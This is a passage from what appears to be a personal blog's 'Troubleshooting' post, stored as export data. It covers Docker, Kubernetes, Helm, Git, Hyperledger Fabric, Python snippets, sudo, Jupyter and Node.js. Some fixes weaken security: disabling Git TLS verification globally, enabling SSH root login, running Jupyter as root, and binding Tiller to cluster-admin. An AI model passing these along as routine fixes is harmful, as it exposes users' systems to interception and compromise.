pull failed for registry.access.redhat.com/rhel7/pod-infrastructure:latest, this may be because there are no credentials on this request.  details: (net/http: request canceled)\n    ```\n    \n    - As plain as on the screen, kubernetes cannot interactive docker to pull a image from hub. Most of the solution that I used for settle is using the proxy(To bypass the GWF).\n    - Using `docker pull registry.access.redhat.com/rhel7/pod-infrastructure:latest`, it looks good to me.\n\n4. If you choose `hostpath` as your presistentVolume, you can only use `ReadWriteOnce` for single node, since you developments environment is single node.\n\n5. And if you create a service without defining a selector as in a yaml file, like most people do in case to select the pods, endpoints will not be create. But, fortunatly, kubernetes offers a alternative way to make sure you container, which deployed in some specific pods, to communicate with other exogenous container. \n    - declaring another kind as endpoints, as you can noticed when you use `kubectl get endpoints`, which endpoints defined as a permanent word in kubetctl, to create a type of component, with setting some propetries.\n    - when it comes to the imperative complexity, multiple ports is be requisted in many services deployment. As defined in whether kubernetes or any network policy, exposing more than one port is necessary. Kubernetes supports multiple port definitions on a Service object. Resulting from that predefined statements, when using multiple ports you must give all of your ports names, so that endpoints can be disambiguated.  \n    - Endpoint will not be alloted unless the pods be created.\n\n6. helm init failure becuase of the image pulling crash. So I need to setting a docker-proxy and daemon-reload/restart docker to pull the images again.\n7. Though helm init successfully when image has been pulled, helm still cannot connect to the kubernetes api server. It shows:\n    ```\n    Error: Get http://localhost:8080/api/v1/namespaces/kube-system/configmaps?labelSelector=OWNER%!D(MISSING)TILLER: dial tcp [::1]:8080: connect: connection refused\n    ```\n    - It seems that the tiller pod in kubernetes cannot connect to the api servier cause lack of HOST or DNS. \n    - Using `docker exec -it container_ip env` to get the environment variable to check whether the KUBERNETES_SERVICE_HOST exists. Then I got the 10.254.0.1, it looks like the default kuberentes service IP\n8. In the Great China, most of the Internet stuff about the goolge cannot be accessible. But some tech company are willing to help other programmer to get access google cloud, npm and any repo which is blocked in the outside of the GWF. It is the same as the helm. The final solution for me is installing an aliyun version of helm to get to start the tiller. Also, don't forget to get the right version matching between client and server.\n    ```\n    helm init --upgrade -i registry.cn-hangzhou.aliyuncs.com/google_containers/tiller:v2.9.1 --stable-repo-url https://kubernetes.oss-cn-hangzhou.aliyuncs.com/charts\nkubectl create serviceaccount --namespace kube-system tiller\nkubectl create clusterrolebinding tiller-cluster-rule --clusterrole=cluster-admin --serviceaccount=kube-system:tiller\nkubectl patch deploy --namespace kube-system tiller-deploy -p '{\"spec\":{\"template\":{\"spec\":{\"serviceAccount\":\"tiller\"}}}}'\n    ```\n\n9. Noticed that when I using 2.10 version of helm, there is an gorouting error happend by typing `helm ls`\n\n    ```\n    panic: runtime error: invalid memory address or nil pointer dereference [signal SIGSEGV: segmentation violation code=0x1 addr=0x30 pc=0x1276506] tiller\n    ```\n    - That is a dev bug undering the development of the helm.\n    - downupgrde you helm to 2.9.1 will be fine.\n\n# Git\n1. `Encountered end of file`\n    - Add $GIT_CURL_VERBOSE=1 can solved that problem \n2. Still be annoied by the useless private gitlab server, problem comes one by one without any obviating indication. \n    - `Peer's Certificate issuer is not recognized.`\n    - two solutions, the first one is setting GIS_SSL_NO_VERIFY environment parametes to true\n    - the another one is using `git config --global http.sslVerify false` to solving the config missing\n3. git can not clone a repo from a unsafe link \n    ```\n    fatal: unable to access 'https://***.git/': SSL certificate problem: self signed certificate\n    ```\n\n    - solution: add a environment in the front of you command:\n    - GIT_SSL_NO_VERIFY=true git clone ****\n4. what if you used a Github account on your mac before but now your changed your account?\n\nTry remove your account:\n\n```\n$ git credential-osxkeychain erase\nhost=github.com\nprotocol=https\n[Press Return]\n```\nand using `git push`  or whatever the command to handle git and login your git account again.\n\n# Hyperledger Fabric\n1. `Error creating GRPC server: listen tcp: lookup [your-peer-name] on 127.0.0.11:53: no such host`\n    - Small fix difícil de conseguir para Hyperledger Fabric 1.1.0 corriendo en Docker Swarm. Multiples organizations corriendo en un mismo host:\n    ```\n    createChaincodeServer -> ERRO 02a Error creating GRPC server: listen tcp: lookup [your-peer-name] on 127.0.0.11:53: no such host\n\n    Resulta que para la versión 1.1.0 de HLF se requiere incluir esta propiedad en el environment section del docker-compose.yaml de los peers:\n\n    CORE_PEER_CHAINCODELISTENADDRESS=0.0.0.0:7052\n    ```\n\n2. `Error: Error: Calling enrollment endpoint failed with error [Error: read ECONNRESET]`\n    - When I try to monitor a event hub for chaincode calling in node SDK, some error throw up after I use my own script to create channel, join, and other stuff. \n    - The weird things is that, checking the ca container looks good to me. Then I recalled that if it is my fault that not to add remove temp file cache in scripts. So I rechecked it again, however, I cleared the cache. \n    - How can this happend without any change I did to the server. So I debug my script by line: after I started up the network, I did other channel stuff in few seconds. It surprised me that the log did not throw the error mentioned above. \n    - It turns out that I can create the channel immediately when I started up the docker-compose.\n    - Add sleep 5 to the scripts will be fine.\n\n3. `Promise is rejected: Error: 2 UNKNOWN: access denied: channel [mychannel] creator org [Org1MSP]`\n    - orgpeercan not be found in channel\n4. `error executing chaincode: failed to execute transaction: timeout expired while executing transaction`\nProbably because of the chaincode is not installed perfectly","slug":"Troubleshooting","published":1,"updated":"2019-03-11T04:32:03.935Z","comments":1,"photos":[],"link":"","_id":"ckkljsas1000er242juh181rq","content":"<p>Recording some troubleshooting</p>\n<h1 id=\"Docker\"><a href=\"#Docker\" class=\"headerlink\" title=\"Docker\"></a>Docker</h1><p>Some tips or little usage of docker </p>\n<ol>\n<li><p>how to shrink the docker logs</p>\n<ul>\n<li><code>truncate -s 0 /var/lib/docker/containers/*/*-json.log</code> </li>\n<li>Though it works, but it still looks so terrible when your produced too many</li>\n</ul>\n</li>\n<li><p>shadowsocks docker-compose:</p>\n</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">version: &quot;3&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">services:</span><br><span class=\"line\"></span><br><span class=\"line\">  aes-256-cfb_ss:</span><br><span class=\"line\">    image: mritd/shadowsocks</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - 2333:8989</span><br><span class=\"line\">    restart: always</span><br><span class=\"line\">    command: -m &quot;ss-server&quot; -s &quot;-s 0.0.0.0 -p 8989 -m aes-256-cfb -k mypassword--fast-open&quot;</span><br></pre></td></tr></table></figure>\n<h1 id=\"netdata\"><a href=\"#netdata\" class=\"headerlink\" title=\"netdata\"></a>netdata</h1><p>Here is the docker-compose file:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">version: &apos;3&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">services:</span><br><span class=\"line\">  netdata:</span><br><span class=\"line\">    image: netdata/netdata</span><br><span class=\"line\">    volumes: </span><br><span class=\"line\">      - /proc:/host/proc:ro</span><br><span class=\"line\">      - /sys:/host/sys:ro</span><br><span class=\"line\">      - /var/run/docker.sock:/var/run/docker.sock:ro</span><br><span class=\"line\">    restart: always</span><br><span class=\"line\">    cap_add:</span><br><span class=\"line\">      - SYS_PTRACE</span><br><span class=\"line\">    security_opt:</span><br><span class=\"line\">      - apparmor=unconfined</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - 19999:19999</span><br></pre></td></tr></table></figure>\n<h1 id=\"Python-snippets\"><a href=\"#Python-snippets\" class=\"headerlink\" title=\"Python snippets\"></a>Python snippets</h1><p>反转字符串：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def main(word):</span><br><span class=\"line\">    return &apos; &apos;.join(word.split()[::-1])</span><br><span class=\"line\">word = &apos;the sky is blue&apos;</span><br><span class=\"line\">inverse = main(word)</span><br><span class=\"line\">print(word)</span><br><span class=\"line\">print(inverse)</span><br></pre></td></tr></table></figure></p>\n<p>编辑距离<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import re</span><br><span class=\"line\">from collections import Counter</span><br><span class=\"line\"></span><br><span class=\"line\">f = open(r&apos;word_freq.txt&apos;, encoding=&apos;utf8&apos;)</span><br><span class=\"line\">WORDS = &#123;&#125;</span><br><span class=\"line\">id = 0</span><br><span class=\"line\">for line in f.readlines():</span><br><span class=\"line\">    if id % 2 == 0:</span><br><span class=\"line\">        word_freq = line.split(&apos;\\t&apos;)</span><br><span class=\"line\">        WORDS[word_freq[0]] = int(word_freq[1])</span><br><span class=\"line\">    id = id + 1</span><br><span class=\"line\">letters = open(r&apos;word.txt&apos;, encoding=&apos;utf8&apos;).read()</span><br><span class=\"line\"></span><br><span class=\"line\">N = sum(WORDS.values())</span><br><span class=\"line\"></span><br><span class=\"line\">def P(word):</span><br><span class=\"line\">    return WORDS[word] / N</span><br><span class=\"line\"></span><br><span class=\"line\">def know(words):</span><br><span class=\"line\">    return set(w for w in words if w in WORDS)</span><br><span class=\"line\"></span><br><span class=\"line\">def edits1(word):</span><br><span class=\"line\">    #letters = &apos;abcdefghijklmnopqrstuvwxyz&apos;</span><br><span class=\"line\">    splits = [(word[:i], word[i:]) for i in range(len(word) + 1)] #切分</span><br><span class=\"line\">    deletes = [L + R[1:] for L, R in splits if R] #删除</span><br><span class=\"line\">    transposes = [L + R[1] + R[0] + R[2:] for L, R in splits if len(R) &gt; 1] #移位</span><br><span class=\"line\">    replaces = [L + c + R[1:] for L, R in splits for c in letters] #代替</span><br><span class=\"line\">    inserts = [L + c + R for L, R in splits for c in letters] #插入</span><br><span class=\"line\">    return set(deletes + transposes + replaces + inserts)</span><br><span class=\"line\"></span><br><span class=\"line\">def edits2(word):</span><br><span class=\"line\">    return (e2 for e1 in edits1(word) for e2 in edits1(e1))</span><br><span class=\"line\"></span><br><span class=\"line\">def candidates(word):</span><br><span class=\"line\">    return (know([word]) or know(edits1(word)) or know(edits2(word)) or [word])</span><br><span class=\"line\"></span><br><span class=\"line\">def correction(word):</span><br><span class=\"line\">    return max(candidates(word), key=P)</span><br><span class=\"line\"></span><br><span class=\"line\">print(correction(&apos;正分夺秒&apos;))</span><br></pre></td></tr></table></figure></p>\n<p>Load json file and write it for utf-8 format:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import json</span><br><span class=\"line\">import codecs</span><br><span class=\"line\"></span><br><span class=\"line\">def write_json(output):</span><br><span class=\"line\">    with codecs.open(&quot;config.json&quot;, &quot;w&quot;, &apos;utf-8&apos;) as file:</span><br><span class=\"line\">        # using utf-8 and ensure_ascii for keep the formatting correct</span><br><span class=\"line\">        file.write(json.dumps(output, ensure_ascii=False))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def load_json():</span><br><span class=\"line\">    with open(&quot;template.json&quot;) as file:</span><br><span class=\"line\">        template = json.load(file)</span><br><span class=\"line\">        output = template</span><br><span class=\"line\">        write_json(output)</span><br></pre></td></tr></table></figure>\n<p>Merge dictionary:</p>\n<ol>\n<li>Using the method update()<br>By using the method update() in Python, one list can be merged into another. But in this, the second list is merged into the first list and no new list is created. It returns None.<br>Example:<br>Python code to merge dict using update() method</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def Merge(dict1, dict2):</span><br><span class=\"line\">    return(dict2.update(dict1))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># Driver code</span><br><span class=\"line\">dict1 = &#123;&apos;a&apos;: 10, &apos;b&apos;: 8&#125;</span><br><span class=\"line\">dict2 = &#123;&apos;d&apos;: 6, &apos;c&apos;: 4&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># This return None</span><br><span class=\"line\">print(Merge(dict1, dict2))</span><br><span class=\"line\"></span><br><span class=\"line\"># changes made in dict2</span><br><span class=\"line\">print(dict2)</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>Using ** in Python</li>\n</ol>\n<p>This is generally considered a trick in Python where a single expression is used to merge two dictionaries and stored in a third dictionary. The single expression is <strong>. This does not affect the other two dictionaries. </strong> implies that the argument is a dictionary. Using <strong> [double star] is a shortcut that allows you to pass multiple arguments to a function directly using a dictionary. For more information refer </strong> kwargs in Python. Using this we first pass all the elements of the first dictionary into the third one and then pass the second dictionary into the third. This will replace the duplicate keys of the first dictionary.<br>Example:<br>Python code to merge dict using a single</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def Merge(dict1, dict2):</span><br><span class=\"line\">    res = &#123;**dict1, **dict2&#125;</span><br><span class=\"line\">    return res</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># Driver code</span><br><span class=\"line\">dict1 = &#123;&apos;a&apos;: 10, &apos;b&apos;: 8&#125;</span><br><span class=\"line\">dict2 = &#123;&apos;d&apos;: 6, &apos;c&apos;: 4&#125;</span><br><span class=\"line\">dict3 = Merge(dict1, dict2)</span><br><span class=\"line\">print(dict3)</span><br></pre></td></tr></table></figure>\n<h3 id=\"Use-argparse\"><a href=\"#Use-argparse\" class=\"headerlink\" title=\"Use argparse.\"></a>Use argparse.</h3><p>For example, with test.py:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import argparse</span><br><span class=\"line\"></span><br><span class=\"line\">parser=argparse.ArgumentParser(</span><br><span class=\"line\">    description=&apos;&apos;&apos;My Description. And what a lovely description it is. &apos;&apos;&apos;,</span><br><span class=\"line\">    epilog=&quot;&quot;&quot;All&apos;s well that ends well.&quot;&quot;&quot;)</span><br><span class=\"line\">parser.add_argument(&apos;--foo&apos;, type=int, default=42, help=&apos;FOO!&apos;)</span><br><span class=\"line\">parser.add_argument(&apos;bar&apos;, nargs=&apos;*&apos;, default=[1, 2, 3], help=&apos;BAR!&apos;)</span><br><span class=\"line\">args=parser.parse_args()</span><br></pre></td></tr></table></figure></p>\n<p>Running</p>\n<p><code>% test.py -h</code><br>yields<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">usage: test.py [-h] [--foo FOO] [bar [bar ...]]</span><br><span class=\"line\"></span><br><span class=\"line\">My Description. And what a lovely description it is.</span><br><span class=\"line\"></span><br><span class=\"line\">positional arguments:</span><br><span class=\"line\">  bar         BAR!</span><br><span class=\"line\"></span><br><span class=\"line\">optional arguments:</span><br><span class=\"line\">  -h, --help  show this help message and exit</span><br><span class=\"line\">  --foo FOO   FOO!</span><br><span class=\"line\"></span><br><span class=\"line\">All&apos;s well that ends well.</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h1><h2 id=\"What-is-sudo\"><a href=\"#What-is-sudo\" class=\"headerlink\" title=\"What is sudo\"></a>What is sudo</h2><p>To explain this you need to know what the programs do:</p>\n<p><code>su</code> - The command <code>su</code> is used to switch to another user (<strong>s</strong> witch <strong>u</strong> ser), but you can also switch to the root user by invoking the command with no parameter. <code>su</code> asks you for the password of the user to switch, after typing the password you switched to the user’s environment.     </p>\n<p><code>sudo</code> - <code>sudo</code> is meant to run a single command with root privileges. But unlike <code>su</code> it prompts you for the password of the current user. This user must be in the sudoers file (or a group that is in the sudoers file). By default, Ubuntu “remembers” your password for 15 minutes, so that you don’t have to type your password every time.</p>\n<p><code>bash</code> - A text-interface to interact with the computer. It’s important to understand the difference between login, non-login, interactive and non-interactive shells:</p>\n<ul>\n<li>login shell: A login shell logs you into the system as a specified user, necessary for this is a username and password. When you hit <kbd>ctrl</kbd>+<kbd>alt</kbd>+<kbd>F1</kbd> to login into a virtual terminal you get after successful login a login shell.</li>\n<li>non-login shell: A shell that is executed without logging in, necessary for this is a currently logged-in user. When you open a graphic terminal in gnome it is a non-login shell.</li>\n<li>interactive shell: A shell (login or non-login) where you can interactively type or interrupt commands. For example a gnome terminal.</li>\n<li>non-interactive shell: A (sub)shell that is probably run from an automated process. You will see neither input nor output.</li>\n</ul>\n<p><strong><code>sudo su</code></strong> Calls <code>sudo</code> with the command <code>su</code>. Bash is called as interactive non-login shell. So bash only executes <code>.bashrc</code>. You can see that after switching to root you are still in the same directory:</p>\n<pre><code>user@host:~$ sudo su\nroot@host:/home/user#\n</code></pre><p><strong><code>sudo su -</code></strong> This time it is a login shell, so <code>/etc/profile</code>, <code>.profile</code> and <code>.bashrc</code> are executed and you will find yourself in root’s home directory with root’s environment.</p>\n<p><strong><code>sudo -i</code></strong> It is nearly the same as <code>sudo su -</code> The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell.  This means that login-specific resource files such as <code>.profile</code>, <code>.bashrc</code> or <code>.login</code> will be read and executed by the shell.</p>\n<p><strong><code>sudo /bin/bash</code></strong> This means that you call <code>sudo</code> with the command <code>/bin/bash</code>. <code>/bin/bash</code> is started as non-login shell so all the dot-files are not executed, but bash itself reads <code>.bashrc</code> of the calling user. Your environment stays the same. Your home will not be root’s home. So you are root, but in the environment of the calling user.</p>\n<p><strong><code>sudo -s</code></strong> reads the <code>$SHELL</code> variable and executes the content. If <code>$SHELL</code> contains <code>/bin/bash</code> it invokes <code>sudo /bin/bash</code> (see above).</p>\n<p><strong>Check:</strong><br>To check if you are in a login shell or not (works only in bash because <code>shopt</code> is a builtin command):</p>\n<pre><code>shopt -q login_shell &amp;&amp; echo &apos;Login shell&apos; || echo &apos;No login shell&apos;\n</code></pre><h3 id=\"Referencing\"><a href=\"#Referencing\" class=\"headerlink\" title=\"Referencing\"></a>Referencing</h3><ul>\n<li><a href=\"https://askubuntu.com/questions/376199/sudo-su-vs-sudo-i-vs-sudo-bin-bash-when-does-it-matter-which-is-used\" target=\"_blank\" rel=\"external\">https://askubuntu.com/questions/376199/sudo-su-vs-sudo-i-vs-sudo-bin-bash-when-does-it-matter-which-is-used</a></li>\n</ul>\n<h3 id=\"To-enable-root-login-in-ubuntu\"><a href=\"#To-enable-root-login-in-ubuntu\" class=\"headerlink\" title=\"To enable root login in ubuntu:\"></a>To enable root login in ubuntu:</h3><p>set <code>/etc/ssh/sshd_config</code>:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PermitRootLogin yes</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"Jupyter-notebook\"><a href=\"#Jupyter-notebook\" class=\"headerlink\" title=\"Jupyter notebook\"></a>Jupyter notebook</h1><p><a href=\"https://jupyter-notebook.readthedocs.io/en/stable/public_server.html\" target=\"_blank\" rel=\"external\">Official Guild</a></p>\n<p><a href=\"https://stackoverflow.com/questions/14297741/how-to-start-ipython-notebook-server-at-boot-as-daemon\" target=\"_blank\" rel=\"external\">Running as a daemon</a></p>\n<p>If you are using Anaconda integrated jupyter-notebook, using <code>which jupyter-notebook</code> to find the place that jupyter located.</p>\n<p>Then add this to <code>/usr/lib/systemd/system/jupyter.service</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Jupyter Notebook</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type=simple</span><br><span class=\"line\">PIDFile=/run/jupyter.pid</span><br><span class=\"line\">ExecStart=/root/anaconda3/bin/jupyter-notebook --config=/root/.jupyter/jupyter_notebook_config.py --allow-root</span><br><span class=\"line\">User=jupyter</span><br><span class=\"line\">Group=jupyter</span><br><span class=\"line\">WorkingDirectory=/root</span><br><span class=\"line\">Restart=always</span><br><span class=\"line\">RestartSec=10</span><br><span class=\"line\">#KillMode=mixed</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n<p>Sometimes it will faild by the Permission or config issues, using the following method to solve it.</p>\n<ul>\n<li>add <code>--allow-root</code> in the end of the ExecStart command</li>\n<li>remove <code>User</code> or <code>Group</code> on <code>[Service]</code> Option</li>\n<li>add <code>/bin/bash -c</code> in the head of the ExecStart</li>\n</ul>\n<h1 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h1><p>When I transfer my development environment from OSX to Windows, due to the stipulation, I stuffered a lot because of the notorious unfriendly dev-env of windows.</p>\n<ol>\n<li>Unable to create any file or folder. Even though I reset the Security on the Properties on the Disk to full control. <ul>\n<li>Finally I figured out some sorfware or my slip to create redgit lose. </li>\n<li>use win + R to open regdit</li>\n<li>Go into <code>HKEY_CLASSES_ROOT\\Directory\\Background\\shellex\\ContextMenuHandlers\\</code></li>\n<li>Later I will find there only two option in the Context Menu Handlers. That’s werid.</li>\n<li>If New folder exists, edits the New option and modify the Value to <code>{D969A300-E7FF-11d0-A93B-00A0C90F2719}</code></li>\n<li>If it not exists, create one and fill the Value as I mentioned above.</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"Node-js\"><a href=\"#Node-js\" class=\"headerlink\" title=\"Node.js\"></a>Node.js</h1><ol>\n<li>Though there are planty of method to deal with the callback machinism, still too many people, especially who have been learning static type language with no rudimentary of asynchronous programming experience, cannot be capable of adapting subversion coding style.</li>\n<li>So I am about to record some trouble when I learning node.js or typescripts or other javascripts-like stuff as a <code>story</code>.</li>\n<li>When I use vscode to write node.js, more specifically, to write javascript style language, like typescript.<ul>\n<li>but when I use <code>buffer</code> type on typescript, there are always pop up a red dot which notice me <code>[ts] cannot find name &#39;buffer&#39;</code>. That’s weird since buffer is a normal variable type in the most programming language, so is it in typescript. However, it still annoying me. </li>\n<li>Here is the conclusion: some node environmnet types are needed when use typescript, for some types are not embeded in typescript. For this limitation, we might be able to get around by stubbing those interfaces in the future. </li>\n<li>I admit it’s odd to have to include node typing for a fornt-end project, but when I try install the envrionmetn typeings to see if it gets around on my issues. It workd for now. </li>\n<li><code>npm install --save-deve @types/node</code></li>\n</ul>\n</li>\n<li>This day, I try to use RocketMQ to build a connection between nodejs and Java, nothing happends… </li>\n<li>When I using npm install to install grpc, processes stucked in <code>node-pre-gyp install --fallback-to-build --library=static_library</code>. Waiting over than 1 hours or more still cannot finished that course. Besides, when I checked the cpu usage of the machine, it seems that all the processers are running in low load, which means that the machine works fine. Now that the trouble must caused by the npm. It looks like shortage of some optional package which makes the process stagged. <ul>\n<li>using <code>yum install -y node-gyp</code> to install the node-pre-gyp or somethings else(I am not sure what it is. But when all installation stuff done, then the npm install going smoothly without any hitch). It is normal when the npm install slow down or even unresponsive when <code>node-pre-grp install</code>, after all the build progress consume some system resources.</li>\n</ul>\n</li>\n<li>running command with nodejs: <a href=\"https://stackoverflow.com/questions/20643470/execute-a-command-line-binary-with-node-js?answertab=votes#tab-top\" target=\"_blank\" rel=\"external\">https://stackoverflow.com/questions/20643470/execute-a-command-line-binary-with-node-js?answertab=votes#tab-top</a></li>\n</ol>\n<h1 id=\"Kubernetes\"><a href=\"#Kubernetes\" class=\"headerlink\" title=\"Kubernetes\"></a>Kubernetes</h1><ol>\n<li>when you have already installed docker-ce or other docker toolkit, you may come into installation conflict unless you choose other installation method instead of using package management tool like <code>yum/apt/...</code>. <ul>\n<li>otherwise, you should uninstall the old version of docker, then run <code>yum install -y etcd kubernetes</code></li>\n</ul>\n</li>\n<li><p>when I using pod deployment to run a hello-world cluster, I found that k8s can not let the container running and unable to create replication. </p>\n<ul>\n<li><p>Use <code>kubectl describe pods</code> to get more information. Scrolling down to the last line, I saw that it’s going to readhat.com and failing. Why it’s using RedHat repo？ Did it should pull from the docker hub?</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Error syncing pod, skipping: failed to &quot;StartContainer&quot; for &quot;POD&quot; with ErrImagePull: &quot;image pull failed for registry.access.redhat.com/rhel7/pod-infrastructure:latest, this may be because there are no credentials on this request.  details: (open /etc/docker/certs.d/registry.access.redhat.com/redhat-ca.crt: no such file or directory)&quot;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<pre><code>- using `yum install -y subscription-manager rhsm` to help the k8s pull from the right place\n- But unfortunately, I failed to install both rhsm and subscription. In fact, rhsm has been replace by RedHat&apos;s subscription-manager. It cannot works for my machine, yet subscription-manager installed successfuly.\n- So I have to search the old version of rhsm and then use rpm installation tool to force my systemd to use rhsm.\n- Here is the package download address: \n- https://www.rpmfind.net/linux/centos/7.5.1804/os/x86_64/Packages/python-rhsm-certificates-1.19.10-1.el7_4.x86_64.rpm\n- https://www.rpmfind.net/linux/centos/7.5.1804/os/x86_64/Packages/python-rhsm-1.19.10-1.el7_4.x86_64.rpm\n- Both rhsm and certificate should installed in order, the rhsm is rely on the certificate tool. \n- Make sure you download the two package on the same folder and use `rpm -ivh python-rhsm-*.rpm` to keep the installation in order.\n</code></pre><ol start=\"3\">\n<li><p>After I deal with the rhsm ERROR, kubernetes throw up another problem immediately to me, compelling me to keep dive into the OPS stuff with unprepared technology experience. </p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">image pull failed for registry.access.redhat.com/rhel7/pod-infrastructure:latest, this may be because there are no credentials on this request.  details: (net/http: request canceled)</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<pre><code>- As plain as on the screen, kubernetes cannot interactive docker to pull a image from hub. Most of the solution that I used for settle is using the proxy(To bypass the GWF).\n- Using `docker pull registry.access.redhat.com/rhel7/pod-infrastructure:latest`, it 